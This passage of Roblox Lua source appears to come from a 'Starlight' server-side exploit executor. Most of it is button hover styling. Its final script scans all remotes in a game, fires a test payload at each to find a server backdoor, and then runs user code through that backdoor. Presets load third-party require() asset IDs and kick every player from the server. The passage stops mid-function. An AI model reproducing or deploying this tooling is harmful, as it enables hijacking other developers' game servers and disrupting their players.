            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function DCXHTW_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Presets.ScrollingFrame.Destroui.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Destroui"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function HAPBIMG_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Presets.ScrollingFrame.Trash.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Trash"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function TYZR_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Presets.ScrollingFrame.Polaria.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Polaria"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function TXEYOPU_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Presets.ScrollingFrame.Hub.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Hub"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function YNCXLWZ_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Presets.ScrollingFrame.Star.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Star"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function XTWHDO_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Presets.ScrollingFrame.ExSer.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_ExSer"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function TBHOZTE_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Presets.ScrollingFrame.AntiSkidd.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_AntiSkidd"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function VTASMP_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Logs.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Logs"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	local LogService = game:GetService("LogService")
	local logs = {}
	local scrollingFrame = script.Parent.ScrollingFrame
	local template = scrollingFrame.Template
	
	local function onMessageOut(message, messageType)
		table.insert(logs, {text = message, type = messageType})
	
		local newLabel = template:Clone()
		newLabel.Text = message
		newLabel.Parent = scrollingFrame
		newLabel.Visible = true
	end
	
	LogService.MessageOut:Connect(onMessageOut)
	
	local function getLogs()
		return logs
	end
	
	_G.getConsoleLogs = getLogs
	
end
local function PLKZZOR_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Logs.ToggleMode.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_ToggleMode"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function BWQCRM_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Logs.BG.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_BG"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function IKQCZT_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Sidebar.Executor.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Executor"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function GDFUP_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Sidebar.Presets.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Presets1"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function FIUUFGW_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Sidebar.Logs.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Logs1"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function STVZ_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Verify.Btn.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Btn"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	script.Parent.MouseEnter:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	script.Parent.MouseButton1Up:Connect(function()
		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function DKHCTC_fake_script() -- Fake Script: StarterGui.Starlight.Frame.m.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_m"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	local button = script.Parent
	local frame = button.Parent.Parent
	
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(22,22,22)
		button.UIStroke.Color = Color3.fromRGB(65,65,65)
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(16,16,16)
		button.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
	button.MouseButton1Down:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(10,10,10)
		button.UIStroke.Color = Color3.fromRGB(50,50,50)
	end)
	button.MouseButton1Up:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(16,16,16)
		button.UIStroke.Color = Color3.fromRGB(57,57,57)
	end)
end
local function NVOZR_fake_script() -- Fake Script: StarterGui.Starlight.Frame.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Frame"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	if game:GetService("UserInputService").TouchEnabled then
		script.Parent.Size = UDim2.new(script.Parent.Size.X.Scale * 0.75, script.Parent.Size.X.Offset * 0.75,
			script.Parent.Size.Y.Scale * 0.75, script.Parent.Size.Y.Offset * 0.75)
		for _, ui in ipairs(script.Parent:GetDescendants()) do
			if ui:IsA("GuiObject") then
				ui.Size = UDim2.new(ui.Size.X.Scale * 0.75, ui.Size.X.Offset * 0.75,
					ui.Size.Y.Scale * 0.75, ui.Size.Y.Offset * 0.75)
			end
		end
	end
end
local function ZXOSLR_fake_script() -- Fake Script: StarterGui.Starlight.Frame.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Frame"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	local player = game.Players.LocalPlayer
	local mouse = player:GetMouse()
	local userInputService = game:GetService("UserInputService")
	local tweenService = game:GetService("TweenService")
	local HttpService = game:GetService("HttpService")
	local RunService = game:GetService("RunService")
	
	local rs = game:GetService("ReplicatedStorage")
	local mode =3
	local bg=1
	
	
	local TweenService = game:GetService("TweenService")
	local currentFadeOutThread = nil
	
	local function showNotification(titleText, descText, duration)
		local notif = script.Parent.Notification
		local title = notif:WaitForChild("Title")
		local desc = notif:WaitForChild("Desc")
	
		-- cancel prev fade out thread
		if currentFadeOutThread then
			task.cancel(currentFadeOutThread)
		end
	
		-- set text + show
		title.Text = titleText
		desc.Text = descText
		notif.Visible = true
		notif.BackgroundTransparency = 1
		title.TextTransparency = 1
		desc.TextTransparency = 1
	
		-- fade in
		TweenService:Create(notif, TweenInfo.new(0.3), {
			BackgroundTransparency = 0.2
		}):Play()
		TweenService:Create(title, TweenInfo.new(0.3), {
			TextTransparency = 0
		}):Play()
		TweenService:Create(desc, TweenInfo.new(0.3), {
			TextTransparency = 0
		}):Play()
	
		-- start new fade out thread
		currentFadeOutThread = task.spawn(function()
			task.wait(duration)
	
			-- fade out
			TweenService:Create(notif, TweenInfo.new(0.3), {
				BackgroundTransparency = 1
			}):Play()
			TweenService:Create(title, TweenInfo.new(0.3), {
				TextTransparency = 1
			}):Play()
			TweenService:Create(desc, TweenInfo.new(0.3), {
				TextTransparency = 1
			}):Play()
	
			task.wait(0.3)
			notif.Visible = false
		end)
	end
	
	
	local EXCLUDED_REMOTES = {
		UpdateCurrentCall = true, CanChatWith = true, OnNewMessage = true,
		OnMessageDoneFiltering = true, OnChannelJoined = true, OnNewSystemMessage = true,
		NewPlayerGroupDetails = true, ClientLoaded = true, SetPlayerReady = true,
		SetCoreGuiEnabled = true, SetCore = true, DispatchEvent = true,
		PromptGamePassPurchaseFinished = true, PromptPurchaseFinished = true,
		PromptSubscriptionFinished = true, InspectMenuFromMouse = true,
		GetServerVersion = true, GetClientId = true, GetInventory = true,
		GetFriends = true, GetAccountInfo = true, RequestServerSaves = true,
		UpdatePlayerBlockList = true, SetAvatarBlockList = true,
		SetFriendRequestEvent = true, NewFollower = true, PerformAction = true,
		ReportAbuse = true
	}
	
	local SAFE_LOCATIONS = {
		["CoreGui"] = true,
		["ServerStorage"] = true,
		["ReplicatedFirst"] = true,
		["ServerScriptService"] = true
	}
	
	local foundExploit = false
	local remoteEvent, remoteFunction
	local FinishedFound = false
	local scannedRemotes = {}
	
	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then return false end
		if EXCLUDED_REMOTES[remote.Name] then return false end
	
		return true
	end
	
	local function testRemote(remote, isFunction, timeout)
		if foundExploit or scannedRemotes[remote] then return false end
		scannedRemotes[remote] = true
		if not isLikelyBackdoorRemote(remote) then return false end
	
		local modelName = "starlight_"..tostring(math.random(1,999999))
		local foundEvent = false
	
		local connection = rs.DescendantAdded:Connect(function(inst)
			if inst.Name == modelName then
				foundEvent = true
			end
		end)
	
		local function cleanup()
			connection:Disconnect()
			local f = rs:FindFirstChild(modelName)
			if f then f:Destroy() end
		end
	
		local payload = [[
			local m=Instance.new("ObjectValue")
			m.Name="]]..modelName..[["
			m.Parent=game:GetService("ReplicatedStorage")
		]]
	
		local finished = false
	
		task.spawn(function()
			pcall(function()
				if isFunction then
					remote:InvokeServer(payload .. "\nreturn true")
				else
					remote:FireServer(payload)
				end
			end)
			finished = true
		end)
	
		local start = os.clock()
		while os.clock() - start < timeout do
			if foundEvent or rs:FindFirstChild(modelName) then
				foundEvent = true
				break
			end
			if finished then break end
			task.wait()
		end
	
		cleanup()
	
		if foundEvent and not foundExploit then
			foundExploit = true
			if isFunction then
				remoteFunction = remote
			else
				remoteEvent = remote
			end
			return true
		end
	
		return false
	end
	
	local function fastFindRemote(timeout)
		foundExploit = false
		remoteEvent = nil
		remoteFunction = nil
		scannedRemotes = {}
	
		local remotes = {}
		for _, remote in ipairs(game:GetDescendants()) do
			if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
				table.insert(remotes, remote)
			end
		end
	
		print(string.format("💫 starlight: 🔍 scanning %d remotes", #remotes))
	
		table.sort(remotes, function(a, b)
			-- sort: sus name/loc first
			local aScore = isLikelyBackdoorRemote(a) and 1 or 0
			local bScore = isLikelyBackdoorRemote(b) and 1 or 0
			return aScore > bScore
		end)
	
		local MAX_CONCURRENT = 1024
		local activeTasks = 0
		local taskDone = Instance.new("BindableEvent")
	
		for i = 1, #remotes do
			if foundExploit then break end
	
			while activeTasks >= MAX_CONCURRENT do
				taskDone.Event:Wait()
			end
	
			activeTasks += 1
			task.spawn(function()
				local ok, result = pcall(function()
					return testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"), timeout)
				end)
	
				if ok and result then
					print("💫 starlight: backdoor found:", remotes[i]:GetFullName())
				end
	
				activeTasks -= 1
				taskDone:Fire()
			end)
		end
	
		while activeTasks > 0 and not foundExploit do
			taskDone.Event:Wait()
		end
	
		if not foundExploit then
			print("💫 starlight: backdoor not found")
		end
	
		return foundExploit
	end
	
	local function findRemote()
		local trueStart = os.clock()
		local tStart = os.clock()
	
		fastFindRemote(0.1)
	
		scanTime = os.clock() - trueStart
		FinishedFound = true
		print(string.format("💫 starlight: scan completed in %.3f seconds", os.clock() - tStart))
	end
	
	local function fireRemoteEvent(code)
		if remoteEvent then
			print("ℹ️ executing code through backdoor:", remoteEvent:GetFullName())
			local success = pcall(function()
				remoteEvent:FireServer(code)
			end)
			if success then
				showNotification("starlight 💫", "✅ successfully ran script!", 1)
			else
				showNotification("starlight 💫", "❌ failed to run script!", 3)
			end
		elseif remoteFunction then
			print("ℹ️ executing code through backdoor:", remoteFunction:GetFullName())
			local success, result = pcall(function()
				return remoteFunction:InvokeServer(code)
			end)
			if success then
				showNotification("starlight 💫", "✅ successfully ran script!", 1)
			else
				showNotification("starlight 💫", "❌ failed to run script!", 3)
			end
		else
			warn("💫 starlight: no backdoor, cannot execute code.")
			showNotification("starlight 💫", "no backdoor found, or you didn't scan - can't run code.", 3)
		end
	end
	script.Parent.Sidebar.Presets.MouseButton1Click:Connect(function()
		script.Parent.Framee.Visible = false
		script.Parent.Presets.Visible = true
		script.Parent.Logs.Visible = false
	end)
	script.Parent.Presets.ScrollingFrame.Polaria.MouseButton1Click:Connect(function()
		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(123255432303221):Pload("' .. game.Players.LocalPlayer.Name ..  '")'
		script.Parent.Framee.Visible = true
		script.Parent.Presets.Visible = false
		script.Parent.Logs.Visible = false
	end)
	script.Parent.m.MouseButton1Click:Connect(function()
		script.Parent.Visible = false
		script.Parent.Parent.str.Visible = true
	end)
	script.Parent.Parent.str.MouseButton1Click:Connect(function()
		script.Parent.Visible = true
		script.Parent.Parent.str.Visible = false
	end)
	script.Parent.Presets.ScrollingFrame.Shutdown.MouseButton1Click:Connect(function()
		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'for _, player in pairs(game.Players:GetPlayers()) do player:Kick("The server has shutdown.") end'
		script.Parent.Framee.Visible = true
		script.Parent.Presets.Visible = false
		script.Parent.Logs.Visible = false
	end)
	script.Parent.Framee.rsix.MouseButton1Click:Connect(function()
		fireRemoteEvent('require(3436957371):r6("' .. game.Players.LocalPlayer.Name .. '")')
	end)
	script.Parent.Presets.ScrollingFrame.Trash.MouseButton1Click:Connect(function()
		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(17182254638)("' .. game.Players.LocalPlayer.Name ..  '")'
		script.Parent.Framee.Visible = true
		script.Parent.Presets.Visible = false
		script.Parent.Logs.Visible = false
	end)
	script.Parent.Presets.ScrollingFrame.Hub.MouseButton1Click:Connect(function()
		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = '-- removed for now because of people abusing'
		script.Parent.Framee.Visible = true
		script.Parent.Presets.Visible = false
		script.Parent.Logs.Visible = false
	end)
	script.Parent.Sidebar.Logs.MouseButton1Click:Connect(function()
		script.Parent.Framee.Visible = false
		script.Parent.Logs.Visible = true
		script.Parent.Presets.Visible = false
	end)
	script.Parent.Sidebar.Executor.MouseButton1Click:Connect(function()
		script.Parent.Framee.Visible = true
		script.Parent.Logs.Visible = false
		script.Parent.Presets.Visible = false
	end)
	script.Parent.Presets.ScrollingFrame.Sledge.MouseButton1Click:Connect(function()
		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(8038037940).CLoad("' .. game.Players.LocalPlayer.Name ..  '")'
		script.Parent.Framee.Visible = true
		script.Parent.Presets.Visible = false
		script.Parent.Logs.Visible = false
	end)
	script.Parent.Presets.ScrollingFrame.ExSer.MouseButton1Click:Connect(function()
		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(10868847330):pls("' .. game.Players.LocalPlayer.Name ..  '")'
		script.Parent.Framee.Visible = true
		script.Parent.Presets.Visible = false
		script.Parent.Logs.Visible = false
	end)
	script.Parent.Presets.ScrollingFrame.Grab.MouseButton1Click:Connect(function()
		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(18665717275).load("' .. game.Players.LocalPlayer.Name ..  '")'
		script.Parent.Framee.Visible = true
		script.Parent.Presets.Visible = false
		script.Parent.Logs.Visible = false
	end)
	script.Parent.Presets.ScrollingFrame.Star.MouseButton1Click:Connect(function()
		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'local h=Instance.new("Hint") h.Parent=workspace h.Text="starlight | the best forever!"'
		script.Parent.Framee.Visible = true
		script.Parent.Presets.Visible = false
		script.Parent.Logs.Visible = false
	end)
	script.Parent.Presets.ScrollingFrame.CFour.MouseButton1Click:Connect(function()
		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(0x1767bf813)("' .. game.Players.LocalPlayer.Name ..  '")'
		script.Parent.Framee.Visible = true
		script.Parent.Presets.Visible = false
		script.Parent.Logs.Visible = false
	end)
	script.Parent.Presets.ScrollingFrame.Destroui.MouseButton1Click:Connect(function()
		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(5257685661):Fire("' .. game.Players.LocalPlayer.Name ..  '")'
		script.Parent.Framee.Visible = true
		script.Parent.Presets.Visible = false
		script.Parent.Logs.Visible = false
	end)
	script.Parent.Presets.ScrollingFrame.NukeGio.MouseButton1Click:Connect(function()
		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(4832967293):Fire("' .. game.Players.LocalPlayer.Name ..  '")'
		script.Parent.Framee.Visible = true
		script.Parent.Presets.Visible = false
		script.Parent.Logs.Visible = false
	end)
	script.Parent.Presets.ScrollingFrame.AntiSkidd.MouseButton1Click:Connect(function()
		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(16534611190).AntiSkid("' .. game.Players.LocalPlayer.Name ..  '")'
		script.Parent.Framee.Visible = true
		script.Parent.Presets.Visible = false
		script.Parent.Logs.Visible = false
	end)
	script.Parent.Logs.ToggleMode.MouseButton1Click:Connect(function()
		if remoteFunction or remoteEvent then
			showNotification("starlight 💫", "the backdoor is already found, you don't need to change this!", 3)
			return
		end
		FinishedFound = false
		if mode == 1 then
			mode = 2
			script.Parent.Logs.ToggleMode.Text = "Current scan mode: RemoteFunctions"
			return
		end
		if mode == 2 then
			mode = 3
			script.Parent.Logs.ToggleMode.Text = "Current scan mode: All"
			return
		end
		if mode == 3 then
			mode = 1
			script.Parent.Logs.ToggleMode.Text = "Current scan mode: RemoteEvents"
			return
		end
	end)
	script.Parent.Logs.BG.MouseButton1Click:Connect(function()
		if bg == 1 then
			bg = 2
			script.Parent.bg.Visible = true
			script.Parent.Logs.BG.Text = "Background: Modern"
			return
		end
		if bg == 2 then
			bg = 1
			script.Parent.bg.Visible = false
			script.Parent.Logs.BG.Text = "Background: Static"
			return
		end
	end)
	local scanning = false
	
	script.Parent.Framee.scan.MouseButton1Click:Connect(function()
		if scanning then return end
		scanning = true
		FinishedFound = false
